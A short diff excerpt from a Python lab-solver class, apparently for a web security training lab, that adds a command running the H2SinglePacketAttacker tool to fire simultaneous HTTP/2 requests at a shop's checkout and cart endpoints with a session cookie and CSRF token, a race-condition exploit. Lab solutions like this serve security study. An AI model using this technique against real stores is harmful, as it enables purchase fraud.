@@ -35,6 +35,7 @@ class LabSolver:
         cookie_header = 'Cookie: session={}'.format(self.session.cookies.get('session'))
         csrf = self.get_csrf_token('cart')
 
+        # https://github.com/ma4747gh/H2SinglePacketAttacker
         command = ('python /home/ma4747gh/Desktop/GitHub/H2SinglePacketAttacker/h2_single_packet_attacker.py {} 443 --tls_channel --streams 3 --method POST --path /cart/checkout '
                    '--data \'csrf={}\' --header \'{}\' --header \'break\' --method GET --path / --header \'break\' --method POST '
                    '--path /cart --data \'productId=1&redir=PRODUCT&quantity=1\' --header \'{}\' --header \'break\' '
